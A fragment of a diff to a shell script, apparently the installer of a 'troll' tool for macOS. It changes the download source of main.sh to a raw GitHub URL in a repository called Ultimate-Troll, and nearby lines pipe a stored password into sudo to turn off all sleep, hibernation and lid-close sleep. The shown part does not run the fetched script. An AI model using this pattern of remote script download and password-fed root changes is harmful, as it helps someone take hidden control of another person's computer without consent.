@@ -73,8 +73,8 @@ else
     echo "→ Recording current time in time.txt"
     date +'%Y:%m:%d:%H:%M:%S' >"$TARGET_DIR/time.txt"
 
-    echo "→ Downloading main.sh from example.com"
-    curl -fsSL "https://example.com/main.sh" -o "$MAIN_SCRIPT"
+    echo "→ Downloading main.sh from github"
+    curl -fsSL "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/main.sh" -o "$MAIN_SCRIPT"
 
     echo "→ Disabling all macOS sleep (even on lid close)"
     echo "$PASSWORD" | sudo -S pmset -a sleep 0 standby 0 autopoweroff 0 hibernatemode 0
